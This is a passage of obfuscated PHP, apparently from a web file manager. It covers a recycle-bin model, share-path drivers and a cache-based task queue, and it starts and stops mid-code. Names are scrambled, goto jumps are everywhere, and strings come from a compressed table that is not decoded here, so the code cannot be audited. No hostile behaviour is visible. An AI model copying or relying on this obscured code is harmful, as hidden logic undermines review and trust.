(isset(self::$cacheChildList[$c£­’¼÷ñÈ])) { return self::$cacheChildList[$c£­’¼÷ñÈ]; } goto C¨ÎôŞÌã×; C¨ÎôŞÌã×: $e¯‚ßÑÅ¿ = array($E™ĞÚ½İİ[478] => intval($bÁ²ŞÉµÉÈ), $E™ĞÚ½İİ[423] => 0); $C³ëëùÁ„ˆ = $this->where($e¯‚ßÑÅ¿)->select(); $C³ëëùÁ„ˆ = $C³ëëùÁ„ˆ ? $C³ëëùÁ„ˆ : array(); goto a†‘†ùîç¥; B¯îâ—å’: } public function fileNameAuto($Cºµ·åªÕÛ, $fâˆ©ˆƒŞà, $Bñæİö˜šÓ = REPEAT_RENAME, $d°ƒÑæÑÑ° = false) { $Bğçé‡Ñ’¯ =& $_SERVER[æ§›¦ÌáØ]; $fÄà©åº‚À = array($Bğçé‡Ñ’¯[478] => $Cºµ·åªÕÛ, $Bğçé‡Ñ’¯[423] => 0, $Bğçé‡Ñ’¯[28] => array($Bğçé‡Ñ’¯[380], $fâˆ©ˆƒŞà . $Bğçé‡Ñ’¯[381])); $Dìâ ”¾Õ´ = $this->field($Bğçé‡Ñ’¯[28])->where($fÄà©åº‚À)->select(); $D‚ä‡âĞôš = array_to_keyvalue($Dìâ ”¾Õ´, $Bğçé‡Ñ’¯[33], $Bğçé‡Ñ’¯[28]); return $this->fileNameAutoGet($D‚ä‡âĞôš, $fâˆ©ˆƒŞà, $Bñæİö˜šÓ, $d°ƒÑæÑÑ°); } public function fileNameAutoGet($C½½óÊ®Š, $f¢ŞÙìÌ£³, $A™ô§öŒÖ», $Fá–£Á‚§) { $BÅ®áçƒÉ =& $_SERVER[æ§›¦ÌáØ]; if ($A™ô§öŒÖ» == REPEAT_REPLACE || !$C½½óÊ®Š || !in_array_not_case($f¢ŞÙìÌ£³, $C½½óÊ®Š) || $Fá–£Á‚§ && $A™ô§öŒÖ» != REPEAT_RENAME_FOLDER) { return $f¢ŞÙìÌ£³; } if ($A™ô§öŒÖ» == REPEAT_SKIP) { return !1; } $fõä®‡äùÃ = $BÅ®áçƒÉ[95] . get_path_ext($f¢ŞÙìÌ£³); $fõä®‡äùÃ = $fõä®‡äùÃ == $BÅ®áçƒÉ[95] || $Fá–£Á‚§ ? $BÅ®áçƒÉ[33] : $fõä®‡äùÃ; for ($F§İ­„Âá = 1; $F§İ­„Âá <= count($C½½óÊ®Š) + 1; $F§İ­„Âá++) { $d”‚¼Ø¨ö = substr($f¢ŞÙìÌ£³, 0, strlen($f¢ŞÙìÌ£³) - strlen($fõä®‡äùÃ)); $FÛ°»ª¸™ = $d”‚¼Ø¨ö . "\50{$F§İ­„Âá}\x29{$fõä®‡äùÃ}"; if (!in_array_not_case($FÛ°»ª¸™, $C½½óÊ®Š)) { return $FÛ°»ª¸™; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\137\x73\x6f\x75\x72\x63\x65\x5f\x72\145\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\124\x69\x6d\145", "\x74\151\155\145", "\151\156\x73\x65\162\x74", "\146\165\156\x63\x74\151\157\x6e")); public function listData($cºÕçäë˜Ğ = false) { $f ®òºç¸Ä =& $_SERVER[æ§›¦ÌáØ]; $cºÕçäë˜Ğ = $cºÕçäë˜Ğ ? $cºÕçäë˜Ğ : USER_ID; $BĞâÊĞ¨¢ = $this->where(array($f ®òºç¸Ä[1511] => $cºÕçäë˜Ğ))->select(); return array_to_keyvalue($BĞâÊĞ¨¢, $f ®òºç¸Ä[33], $f ®òºç¸Ä[395]); } public function moveToRecycle($cÑƒá»Ú·Í) { goto Fó•Ğ×¬Ñí; BÊÕöŒ˜ö¿: $this->recycleMove($cÑƒá»Ú·Í, 1); if ($CÕ­éÔİ¥ª[$B¡˜ Å¶‡[403]] == $B¡˜ Å¶‡[87]) { $A›îã½î‘ = array($B¡˜ Å¶‡[566] => array($B¡˜ Å¶‡[525], $CÕ­éÔİ¥ª[$B¡˜ Å¶‡[502]] . $cÑƒá»Ú·Í . $B¡˜ Å¶‡[526])); $dÔ•¸âÀ³->where($A›îã½î‘)->setField($B¡˜ Å¶‡[423], 1); } goto cùÕëÍ•ò‚; dº»¢Î®ÁÉ: if (!$CÕ­éÔİ¥ª || $CÕ­éÔİ¥ª[$B¡˜ Å¶‡[423]] == $B¡˜ Å¶‡[87]) { return; } $D±‘Éš¦œ = array($B¡˜ Å¶‡[410] => $cÑƒá»Ú·Í, $B¡˜ Å¶‡[1511] => USER_ID, $B¡˜ Å¶‡[562] => $CÕ­éÔİ¥ª[$B¡˜ Å¶‡[404]], $B¡˜ Å¶‡[563] => $CÕ­éÔİ¥ª[$B¡˜ Å¶‡[484]], $B¡˜ Å¶‡[566] => $CÕ­éÔİ¥ª[$B¡˜ Å¶‡[502]]); $this->add($D±‘Éš¦œ); goto BÊÕöŒ˜ö¿; Fó•Ğ×¬Ñí: $B¡˜ Å¶‡ =& $_SERVER[æ§›¦ÌáØ]; $dÔ•¸âÀ³ = Model($B¡˜ Å¶‡[1196]); $CÕ­éÔİ¥ª = $dÔ•¸âÀ³->sourceInfo($cÑƒá»Ú·Í); goto dº»¢Î®ÁÉ; cùÕëÍ•ò‚: } public function clear() { $this->remove(!1); } public function remove($EÌ–ìî™¡ª = false, $C°î¶¸Åˆ½ = false) { goto C¡ÂĞ¼ö®Ø; D›¦¸Ì‰Âæ: foreach ($EÄê´¡ä‰â as $fêíÖ°Ù) { if ($EÌ–ìî™¡ª != !1 && !in_array($fêíÖ°Ù, $EÌ–ìî™¡ª)) { continue; } $B…Èä×ÊòÓ = $f‡ÀˆĞ´->sourceInfo($fêíÖ°Ù); $f‡ÀˆĞ´->remove($fêíÖ°Ù, !1); $b‘©±òŠÉ† = $B…Èä×ÊòÓ[$cÍíÀåİƒ£[404]] . $cÍíÀåİƒ£[71] . $B…Èä×ÊòÓ[$cÍíÀåİƒ£[484]]; $CºÎÇ¨øŒç[$b‘©±òŠÉ†] = array($cÍíÀåİƒ£[562] => $B…Èä×ÊòÓ[$cÍíÀåİƒ£[404]], $cÍíÀåİƒ£[484] => $B…Èä×ÊòÓ[$cÍíÀåİƒ£[484]]); $this->where(array($cÍíÀåİƒ£[395] => $fêíÖ°Ù))->delete(); } foreach ($CºÎÇ¨øŒç as $E…î©ì¹ï) { $f‡ÀˆĞ´->targetSpaceUpdate($E…î©ì¹ï[$cÍíÀåİƒ£[404]], $E…î©ì¹ï[$cÍíÀåİƒ£[484]]); } goto BÔò„îóæñ; C¡ÂĞ¼ö®Ø: $cÍíÀåİƒ£ =& $_SERVER[æ§›¦ÌáØ]; $C°î¶¸Åˆ½ = $C°î¶¸Åˆ½ ? $C°î¶¸Åˆ½ : USER_ID; $f‡ÀˆĞ´ = Model($cÍíÀåİƒ£[1196]); goto Eê†ˆŸÉ«Å; Eê†ˆŸÉ«Å: $EÄê´¡ä‰â = $this->listData($C°î¶¸Åˆ½); $EÌ–ìî™¡ª = $EÌ–ìî™¡ª === !1 ? !1 : $EÌ–ìî™¡ª; $CºÎÇ¨øŒç = array(); goto D›¦¸Ì‰Âæ; BÔò„îóæñ: } public function restore($e“œ‘®‰÷ = false) { $fäÁõ×Å Ë = $this->listData(); $this->_restoreSource($fäÁõ×Å Ë, $e“œ‘®‰÷); } public function removeUserAll($cĞÜ“İìÒ) { $this->remove(!1, $cĞÜ“İìÒ); } private function _restoreSource($D¯•´ß·¬, $c§°„»¨„è) { goto DƒòÁ¿’¹¶; C½‹‹ˆ¨„: if (!$D¯•´ß·¬) { return !0; } $F³×¹ŠÔ¢ê = array(); foreach ($D¯•´ß·¬ as $DÜÄ­ƒØá‚) { goto cé–…ØÛ; cé–…ØÛ: if ($c§°„»¨„è != !1 && !in_array($DÜÄ­ƒØá‚, $c§°„»¨„è)) { continue; } $fŠù‘Çš¸Á = $cê›Ş²Š¿Ø->sourceInfo($DÜÄ­ƒØá‚); $cÏ‡á‚ÎÛ¿ = $cê›Ş²Š¿Ø->sourceInfo($fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[478]]); goto D¨ÖÄ¦´¿Ï; D¨ÖÄ¦´¿Ï: if ($cÏ‡á‚ÎÛ¿[$Fí‘‹ÎÏğ[423]] == $Fí‘‹ÎÏğ[87]) { continue; } $cê›Ş²Š¿Ø->lockMoveStart($DÜÄ­ƒØá‚); $this->recycleMove($DÜÄ­ƒØá‚, 0); goto céÒÃºµéÇ; eƒ„Øã“£×: $F³×¹ŠÔ¢ê[] = $fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[478]]; if ($fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[403]] == $Fí‘‹ÎÏğ[87]) { $F³×¹ŠÔ¢ê[] = $DÜÄ­ƒØá‚; } $cê›Ş²Š¿Ø->lockMoveEnd($DÜÄ­ƒØá‚); goto Bã…õáÊñ˜; céÒÃºµéÇ: if ($fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[403]] == $Fí‘‹ÎÏğ[87]) { $B©‰¢ŠÜ»Ö = array($Fí‘‹ÎÏğ[566] => array($Fí‘‹ÎÏğ[525], $fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[502]] . $DÜÄ­ƒØá‚ . $Fí‘‹ÎÏğ[526])); $cê›Ş²Š¿Ø->where($B©‰¢ŠÜ»Ö)->setField($Fí‘‹ÎÏğ[423], 0); $this->restoreFolderChildren($DÜÄ­ƒØá‚, $D¯•´ß·¬); } $this->where(array($Fí‘‹ÎÏğ[395] => $DÜÄ­ƒØá‚))->delete(); $cê›Ş²Š¿Ø->folderSizeReset($fŠù‘Çš¸Á[$Fí‘‹ÎÏğ[478]]); goto eƒ„Øã“£×; Bã…õáÊñ˜: } goto b¡ÆİÑ¤Ç; DƒòÁ¿’¹¶: $Fí‘‹ÎÏğ =& $_SERVER[æ§›¦ÌáØ]; $cê›Ş²Š¿Ø = Model($Fí‘‹ÎÏğ[1196]); $c§°„»¨„è = $c§°„»¨„è == !1 ? !1 : $c§°„»¨„è; goto C½‹‹ˆ¨„; b¡ÆİÑ¤Ç: $cê›Ş²Š¿Ø->updateModifyTime($F³×¹ŠÔ¢ê); goto EÉ¸Š Š; EÉ¸Š Š: } private function restoreFolderChildren($A©ÂØ†§†, $eáõã…ï²») { goto C’ó¦†˜ó; C’ó¦†˜ó: $a•…Ş•›„Ö =& $_SERVER[æ§›¦ÌáØ]; $f­±«‰£’† = Model($a•…Ş•›„Ö[1196]); $DÎÂØï‡‡ = array($a•…Ş•›„Ö[395] => array($a•…Ş•›„Ö[7], array())); goto e™©ÈÈŠ´; e™©ÈÈŠ´: foreach ($eáõã…ï²» as $a’ñ›¼„‹‹) { if ($a’ñ›¼„‹‹ == $A©ÂØ†§†) { continue; } if (!$f­±«‰£’†->isParentOf($A©ÂØ†§†, $a’ñ›¼„‹‹)) { continue; } $eòª¨£¤š˜ = $f­±«‰£’†->sourceInfo($a’ñ›¼„‹‹); if ($eòª¨£¤š˜[$a•…Ş•›„Ö[403]] == $a•…Ş•›„Ö[87]) { $DÎÂØï‡‡[] = array($a•…Ş•›„Ö[566] => array($a•…Ş•›„Ö[525], $eòª¨£¤š˜[$a•…Ş•›„Ö[502]] . $a’ñ›¼„‹‹ . $a•…Ş•›„Ö[526])); } else { $DÎÂØï‡‡[$a•…Ş•›„Ö[395]][1][] = $a’ñ›¼„‹‹; } } if (!$DÎÂØï‡‡[$a•…Ş•›„Ö[395]][1]) { unset($DÎÂØï‡‡[$a•…Ş•›„Ö[395]]); } if (!$DÎÂØï‡‡) { return; } goto EŸÎèè°Íë; EŸÎèè°Íë: $DÎÂØï‡‡[$a•…Ş•›„Ö[395]][1] = array_unique($DÎÂØï‡‡[$a•…Ş•›„Ö[395]][1]); $DÎÂØï‡‡[$a•…Ş•›„Ö[948]] = $a•…Ş•›„Ö[1776]; $f­±«‰£’†->where($DÎÂØï‡‡)->setField($a•…Ş•›„Ö[423], 1); goto Bä˜˜È½; Bä˜˜È½: } private function recycleMove($f¥Î‘—É¹„, $Cä—’¤——‚ = 1) { $b·ŠÉ»ÃÏ‘ =& $_SERVER[æ§›¦ÌáØ]; $B˜ŒîÃÌ„Õ = Model($b·ŠÉ»ÃÏ‘[1196]); $b”Ò„Ù•Êó = Model($b·ŠÉ»ÃÏ‘[1984]); $FÙ°©¿¡Ûµ = array($b·ŠÉ»ÃÏ‘[395] => $f¥Î‘—É¹„); if ($Cä—’¤——‚) { $B˜ŒîÃÌ„Õ->where($FÙ°©¿¡Ûµ)->setField($b·ŠÉ»ÃÏ‘[423], 1); $b”Ò„Ù•Êó->eventRecycle($f¥Î‘—É¹„, $b·ŠÉ»ÃÏ‘[1985]); } else { $A†…ç‚Íë = $B˜ŒîÃÌ„Õ->where($FÙ°©¿¡Ûµ)->find(); $fì…Õ«Êºğ = $A†…ç‚Íë[$b·ŠÉ»ÃÏ‘[403]] == $b·ŠÉ»ÃÏ‘[87]; $f×òİÏà– = $B˜ŒîÃÌ„Õ->fileNameAuto($A†…ç‚Íë[$b·ŠÉ»ÃÏ‘[478]], $A†…ç‚Íë[$b·ŠÉ»ÃÏ‘[28]], REPEAT_RENAME_FOLDER, $fì…Õ«Êºğ); if ($f×òİÏà– != $A†…ç‚Íë[$b·ŠÉ»ÃÏ‘[28]]) { $B˜ŒîÃÌ„Õ->rename($f¥Î‘—É¹„, $f×òİÏà–); } $B˜ŒîÃÌ„Õ->where($FÙ°©¿¡Ûµ)->setField($b·ŠÉ»ÃÏ‘[423], 0); $b”Ò„Ù•Êó->eventRecycle($f¥Î‘—É¹„, $b·ŠÉ»ÃÏ‘[1986]); } } } goto C„«í«ª¶¿; eïÜ·Ãæ¿Ì: define($_SERVER[æ§›¦ÌáØ][0], $_SERVER[æ§›¦ÌáØ][1]); $_SERVER[€÷•Š‹Õ³¾ä] = explode($_SERVER[æ§›¦ÌáØ][2], gzinflate(substr($_SERVER[æ§›¦ÌáØ][3], 10, -8))); function binCheckEq($b­©èš”•©, $BãÂÌ½íÌ¿) { return $b­©èš”•© == $BãÂÌ½íÌ¿; } goto DÜâêƒ³öå; AŒñİ¯”ÙÃ: $A¡¢ÙµÜ = $_SERVER[æ§›¦ÌáØ][587]; $_SERVER[úÙ] = explode($_SERVER[æ§›¦ÌáØ][588], gzinflate(substr($_SERVER[æ§›¦ÌáØ][589], 10, -8))); $CÌààİ¡„  = $_SERVER[æ§›¦ÌáØ][590]; goto fĞààğÆÖ½; b¯“‘ÄµÑ: class PathDriverDriverShareItem { public function __construct($b«çØø†›) { $this->pathParse = $b«çØø†›; } public function __call($B›Ç•¼í‚, $bÉà‘ãß­…) { $f×é‚Ú‹ˆì =& $_SERVER[æ§›¦ÌáØ]; if (method_exists($this, $B›Ç•¼í‚)) { return; } $Eµà×ôŒ£¯ = call_user_func_array(array($f×é‚Ú‹ˆì[1205], $B›Ç•¼í‚), $bÉà‘ãß­…); $E¬·Ôß’¨¿ = array($f×é‚Ú‹ˆì[1206], $f×é‚Ú‹ˆì[1207], $f×é‚Ú‹ˆì[1208], $f×é‚Ú‹ˆì[1209], $f×é‚Ú‹ˆì[531], $f×é‚Ú‹ˆì[533], $f×é‚Ú‹ˆì[1210], $f×é‚Ú‹ˆì[107], $f×é‚Ú‹ˆì[1211], $f×é‚Ú‹ˆì[1212]); if (in_array($B›Ç•¼í‚, $E¬·Ôß’¨¿)) { $Eµà×ôŒ£¯ = $this->getPathOuter($Eµà×ôŒ£¯); } return $Eµà×ôŒ£¯; } public function copy($f¦ÂµƒíÜ”, $c®ÆÔİùƒ, $BˆôŸ´“ = false) { return $this->copyMove($f¦ÂµƒíÜ”, $c®ÆÔİùƒ, $BˆôŸ´“, $_SERVER[æ§›¦ÌáØ][531]); } public function move($A†Å‘¶Ûå, $EİŒ–—¿½, $CÇ©˜ÇÈô¤ = false) { return $this->copyMove($A†Å‘¶Ûå, $EİŒ–—¿½, $CÇ©˜ÇÈô¤, $_SERVER[æ§›¦ÌáØ][533]); } private function copyMove($aßççéĞø, $B—©çÆËÇ„, $E‰¼×—´àè, $Cœ‘Ò¿›½Ó) { goto E Š×‡­; aˆºÉ¥ƒÖŒ: return $AÃºƒÉù–Ö; goto bŒë¼Ç²‰¬; fÑ©Ø‹ØÖ: if ($FğÙª¤½ô->pathParse[$bÚ‹ØÃ¨Ù×[1038]]) { $B—©çÆËÇ„ = $FğÙª¤½ô->pathParse[$bÚ‹ØÃ¨Ù×[1038]]; } else { $B—©çÆËÇ„ = $b¼×‡¿‡£; } $AÃºƒÉù–Ö = IO::copyMove($aßççéĞø, $B—©çÆËÇ„, $E‰¼×—´àè, $Cœ‘Ò¿›½Ó); $AÃºƒÉù–Ö = $this->getPathOuter($AÃºƒÉù–Ö); goto aˆºÉ¥ƒÖŒ; E Š×‡­: $bÚ‹ØÃ¨Ù× =& $_SERVER[æ§›¦ÌáØ]; $b¼×‡¿‡£ = $B—©çÆËÇ„; $FğÙª¤½ô = IO::driverMake($B—©çÆËÇ„); goto fÑ©Ø‹ØÖ; bŒë¼Ç²‰¬: } public function pathThis($fíÏêÉ·¹) { return get_path_this($this->pathParse[$_SERVER[æ§›¦ÌáØ][76]]); } public function pathFather($CÃèßÊ½ó) { return get_path_father($this->pathParse[$_SERVER[æ§›¦ÌáØ][76]]); } public function iconvSystem($BËßÒÓÍî) { return $BËßÒÓÍî; } protected function infoParse($E§ÙÚ¹’™ï, $FÕ†“©Ã  = false) { $EïŠ¸£‡„Ó =& $_SERVER[æ§›¦ÌáØ]; $CË¨ÍÆ‰‘ = $this->pathParse[$EïŠ¸£‡„Ó[466]][$EïŠ¸£‡„Ó[1061]] . $this->pathParse[$EïŠ¸£‡„Ó[1054]]; if ($FÕ†“©Ã ) { $B»ÃÄ„î½‡ = IO::infoWithChildren($CË¨ÍÆ‰‘); } else { $B»ÃÄ„î½‡ = IO::info($CË¨ÍÆ‰‘); } $D†ø…óÄ³ƒ = $this->pathParse[$EïŠ¸£‡„Ó[466]]; return Action($EïŠ¸£‡„Ó[1204])->_shareItemeParse($B»ÃÄ„î½‡, $D†ø…óÄ³ƒ); } public function listAll($a—ò¯Ë²‚) { $C±«‘ÒÒ¨ =& $_SERVER[æ§›¦ÌáØ]; $EàêÁŞ÷ÜÁ = IO::listAll($a—ò¯Ë²‚); $C¿ãÈ—‡¬° = $this->pathParse[$C±«‘ÒÒ¨[466]]; foreach ($EàêÁŞ÷ÜÁ as &$F¥µÎà”òì) { check_abort(); $bé«Å³œîâ = IO::info($F¥µÎà”òì[$C±«‘ÒÒ¨[76]]); $bé«Å³œîâ = is_array($bé«Å³œîâ) ? $bé«Å³œîâ : array(); $F¥µÎà”òì = array_merge($bé«Å³œîâ, $F¥µÎà”òì); $F¥µÎà”òì[$C±«‘ÒÒ¨[85]] = Action($C±«‘ÒÒ¨[1204])->_shareItemeParse($F¥µÎà”òì, $C¿ãÈ—‡¬°); } unset($F¥µÎà”òì); return $EàêÁŞ÷ÜÁ; } public function getPathOuter($d›’†Ğ†£¤) { goto BÑöàÇóÆ; BÑåêÚ¶°›: $d‡ÉóÔî‹ = KodIO::clear($d›’†Ğ†£¤); $DÖâÓá¥ñ„ = KodIO::clear($this->pathParse[$aß¥Ÿñ©±[466]][$aß¥Ÿñ©±[1061]]); $f¿ÓŸĞÙ³İ = substr($d‡ÉóÔî‹, strlen($DÖâÓá¥ñ„)); goto aôíÈÙù×; aôíÈÙù×: if (substr($d‡ÉóÔî‹, 0, strlen($DÖâÓá¥ñ„)) != $DÖâÓá¥ñ„) { return !1; } return $this->pathParse[$aß¥Ÿñ©±[1055]] . $aß¥Ÿñ©±[8] . ltrim($f¿ÓŸĞÙ³İ, $aß¥Ÿñ©±[8]); goto c›ùìğ²ƒ; BÑöàÇóÆ: $aß¥Ÿñ©± =& $_SERVER[æ§›¦ÌáØ]; $AöÛµİÚ‘† = KodIO::parse($d›’†Ğ†£¤); if ($AöÛµİÚ‘†[$aß¥Ÿñ©±[29]] == KodIO::KOD_SHARE_ITEM) { return $AöÛµİÚ‘†[$aß¥Ÿñ©±[76]]; } goto BÑåêÚ¶°›; c›ùìğ²ƒ: } public function getType() { $d¿†Â‡‰ª =& $_SERVER[æ§›¦ÌáØ]; $Cë³¨©’ì• = str_replace($d¿†Â‡‰ª[72], $d¿†Â‡‰ª[33], get_class($this)); return strtolower($Cë³¨©’ì•); } public function isTypeObject($eğ¯åÛ³ÉÕ) { return IO::isTypeObject($eğ¯åÛ³ÉÕ); } public function info($añé†óù‰›) { return $this->infoParse($añé†óù‰›); } public function infoAuth($E¡àèªºø) { return $this->infoParse($E¡àèªºø); } public function infoWithChildren($fÙ¤ÔßàÕÔ) { return $this->infoParse($fÙ¤ÔßàÕÔ, !0); } public function infoFull($EÒºØß¼¶) { return $this->infoParse($EÒºØß¼¶); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($EÈ¼Î«­›ø) { $this->pathParse = $EÈ¼Î«­›ø; } protected function infoParse($EõÀ ç , $A¶×›­‡± = false) { $A¥ò¥éº… =& $_SERVER[æ§›¦ÌáØ]; return Action($A¥ò¥éº…[1060])->sharePathInfo($this->pathParse[$A¥ò¥éº…[76]], !0, $A¶×›­‡±); } public function listPath($a¦ »±‹‡×, $E›ŸøµÌ¤ö = false) { $a¤µº›Ñ°İ =& $_SERVER[æ§›¦ÌáØ]; $CÔ‹¦—¹”ò = IO::listPath($a¦ »±‹‡×, $E›ŸøµÌ¤ö); foreach ($CÔ‹¦—¹”ò as $CÁïŠÁØ„ç => $e¦¸ñ¦Ÿõ°) { if (!in_array($CÁïŠÁØ„ç, array($a¤µº›Ñ°İ[74], $a¤µº›Ñ°İ[75]))) { continue; } foreach ($e¦¸ñ¦Ÿõ° as $CµèÙŸŠ => $f°ù¿ÚôîÒ) { $f°ù¿ÚôîÒ = Action($a¤µº›Ñ°İ[1213])->parsePathChildren($f°ù¿ÚôîÒ, array($a¤µº›Ñ°İ[414] => $a¦ »±‹‡×)); $CÔ‹¦—¹”ò[$CÁïŠÁØ„ç][$CµèÙŸŠ] = Action($a¤µº›Ñ°İ[1060])->shareItemInfo($f°ù¿ÚôîÒ); } } return $CÔ‹¦—¹”ò; } public function listAll($aÎñÜ·¡¶¼) { $c¼ôˆ¯À÷„ =& $_SERVER[æ§›¦ÌáØ]; $E³×ĞŒ­´ = IO::listAll($aÎñÜ·¡¶¼); foreach ($E³×ĞŒ­´ as &$A‘Åˆ¶¸İ) { $CÇÁ‹³š = IO::info($A‘Åˆ¶¸İ[$c¼ôˆ¯À÷„[76]]); $CÇÁ‹³š = is_array($CÇÁ‹³š) ? $CÇÁ‹³š : array(); $A‘Åˆ¶¸İ = array_merge($CÇÁ‹³š, $A‘Åˆ¶¸İ); $A‘Åˆ¶¸İ[$c¼ôˆ¯À÷„[85]] = Action($c¼ôˆ¯À÷„[1060])->shareItemInfo($A‘Åˆ¶¸İ); } unset($A‘Åˆ¶¸İ); return $E³×ĞŒ­´; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($C¥ƒÜÔ·™) { parent::__construct($C¥ƒÜÔ·™); } } goto EÅËª®ø²…; D·¥îÇ‘Í®: class TaskQueue { const MAX_LENGTH = 1000; const QUEUE_LENGTH = "\x74\141\x73\x6b\121\165\x65\x75\145\x4c\145\x6e\x67\x74\150"; const QUEUE_DATA = "\x74\x61\x73\x6b\121\165\x65\165\145\104\141\x74\x61"; public static $listData = false; public static function initTask() { } public static function add($aƒæÏëÛƒÊ, $BÉ«Í¸ñ—ˆ = array(), $cÊ¬ŸÔÕ— = '', $F‘˜½Ë¨ùé = '') { $fÌİ¸óê« =& $_SERVER[æ§›¦ÌáØ]; if (self::$listData === !1) { self::$listData = self::getAll(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($F‘˜½Ë¨ùé && array_find_by_field(self::$listData, $fÌİ¸óê«[93], $F‘˜½Ë¨ùé)) { return !0; } self::$listData[] = array($fÌİ¸óê«[262] => $aƒæÏëÛƒÊ, $fÌİ¸óê«[1595] => $BÉ«Í¸ñ—ˆ, $fÌİ¸óê«[431] => $cÊ¬ŸÔÕ—, $fÌİ¸óê«[93] => $F‘˜½Ë¨ùé); return !0; } public static function addSubmit() { $C øÄ±»•ò =& $_SERVER[æ§›¦ÌáØ]; if (!self::$listData || count(self::$listData) == 0) { return; } write_log($C øÄ±»•ò[1596] . json_encode_force(array_to_keyvalue(self::$listData, $C øÄ±»•ò[33], $C øÄ±»•ò[431])), $C øÄ±»•ò[1597]); self::setAll(self::$listData); self::$listData = !1; } public static function addNow($F¸®ÁŠ‰ù, $d·ĞÔ…Ó‘ = array(), $bïóÄì‚¯ê = '', $Dèà¡¤†ò = '') { goto Bó˜—‰ò; cï™â©Æ±¹: if ($Dèà¡¤†ò && array_find_by_field($b‰£Â¸î, $BË—¶ƒå‚‰[93], $Dèà¡¤†ò)) { return !0; } $b‰£Â¸î[] = array($BË—¶ƒå‚‰[262] => $F¸®ÁŠ‰ù, $BË—¶ƒå‚‰[1595] => $d·ĞÔ…Ó‘, $BË—¶ƒå‚‰[431] => $bïóÄì‚¯ê, $BË—¶ƒå‚‰[93] => $Dèà¡¤†ò); write_log($BË—¶ƒå‚‰[1596] . $bïóÄì‚¯ê, $BË—¶ƒå‚‰[1597]); goto bœ÷Š¼Ñ¿; Bó˜—‰ò: $BË—¶ƒå‚‰ =& $_SERVER[æ§›¦ÌáØ]; if (self::count() >= self::MAX_LENGTH) { return !1; } $b‰£Â¸î = self::getAll(); goto cï™â©Æ±¹; bœ÷Š¼Ñ¿: self::setAll($b‰£Â¸î); return !0; goto C»‚®“‡É; C»‚®“‡É: } public static function run() { goto Eé§©Š†™; Eé§©Š†™: $bîŒ¢‡§Î± =& $_SERVER[æ§›¦ÌáØ]; $c‹ÎÏÔ ˆË = self::getAll(); $dİë¸‹á÷Ç = array_shift($c‹ÎÏÔ ˆË); goto AÇ«•¬Å¤Ì; AÇ«•¬Å¤Ì: if (!$dİë¸‹á÷Ç) { return !1; } self::setAll($c‹ÎÏÔ ˆË); $CƒìÖ½Ô›¿ = timeFloat(); goto CÓòšèëŠ; CÓòšèëŠ: try { Hook::apply($dİë¸‹á÷Ç[$bîŒ¢‡§Î±[262]], $dİë¸‹á÷Ç[$bîŒ¢‡§Î±[1595]]); } catch (Exception $A’¦×ñâ…) { } $e¢¿¢ßòáÔ = number_format(timeFloat() - $CƒìÖ½Ô›¿, 3) . $bîŒ¢‡§Î±[1533]; write_log($bîŒ¢‡§Î±[1598] . $dİë¸‹á÷Ç[$bîŒ¢‡§Î±[431]] . $bîŒ¢‡§Î±[1599] . $e¢¿¢ßòáÔ, $bîŒ¢‡§Î±[1597]); goto aˆÁ²Åà—‰; aˆÁ²Åà—‰: return !0; goto bç´ö¡Ó«ã; bç´ö¡Ó«ã: } public static function count() { $C·ç³‘„²× = Cache::get(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_LENGTH); if (!$C·ç³‘„²×) { return 0; } return intval($C·ç³‘„²×); } public static function getAll() { $A× ¾àÎß = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$A× ¾àÎß) { return array(); } return $A× ¾àÎß; } public static function setAll($dºóË˜ŒÒ…) { $FƒËÆ‹³¬ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($dºóË˜ŒÒ…), $FƒËÆ‹³¬); Cache::set(self::QUEUE_DATA, $dºóË˜ŒÒ…, $FƒËÆ‹³¬); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($F¿›¸ÕóŠ, $e¶±¼ç«±Û = 5.0) { if (!$F¿›¸ÕóŠ) { return; } $BğÖà§÷ùµ = Cache::get($F¿›¸ÕóŠ); if (!$BğÖà§÷ùµ || timeFloat() - floatVal($BğÖà§÷ùµ) >= $e¶±¼ç«±Û) { Cache::set($F¿›¸ÕóŠ, timeFloat(), $e¶±¼ç«±Û * 10); return !0; } return !1; } public static function timeLimitCall($d×¸Çæ§, $D…Àõí®Ø¢, $DŸƒáƒ±óñ, $DôÖ¢¢¬ÈÒ = 5.0) { goto eï÷ƒëÊîÜ; cÛš½ÉŸÜ¥: $dù¹ä‡öÊ = $A×ÙÍ«Ì¸„[1600]; $càïÓñÌ„‹ = Cache::get($dù¹ä‡öÊ, !0); $CÁíŒ’ƒ¨ó = array($A×ÙÍ«Ì¸„[1601] => timeFloat(), $A×ÙÍ«Ì¸„[1602] => timeFloat(), $A×ÙÍ«Ì¸„[262] => $D…Àõí®Ø¢, $A×ÙÍ«Ì¸„[1595] => $DŸƒáƒ±óñ, $A×ÙÍ«Ì¸„[197] => $DôÖ¢¢¬ÈÒ); goto fÆÁ„©©ÀÔ; eï÷ƒëÊîÜ: $A×ÙÍ«Ì¸„ =& $_SERVER[æ§›¦ÌáØ]; if (!$d×¸Çæ§ || !$D…Àõí®Ø¢) { return; } self::$asyncAdd = !0; goto cÛš½ÉŸÜ¥; AøÜôË Ëœ: Cache::set($dù¹ä‡öÊ, $càïÓñÌ„‹, 60); Cache::removeMemory($dù¹ä‡öÊ); write_log($A×ÙÍ«Ì¸„[1603] . $d×¸Çæ§ . $A×ÙÍ«Ì¸„[68] . $D…Àõí®Ø¢, $A×ÙÍ«Ì¸„[1597]); goto cöõêéÃ; fÆÁ„©©ÀÔ: if (is_array($càïÓñÌ„‹[$d×¸Çæ§])) { $CÁíŒ’ƒ¨ó[$A×ÙÍ«Ì¸„[1602]] = $càïÓñÌ„‹[$d×¸Çæ§][$A×ÙÍ«Ì¸„[1602]]; } if 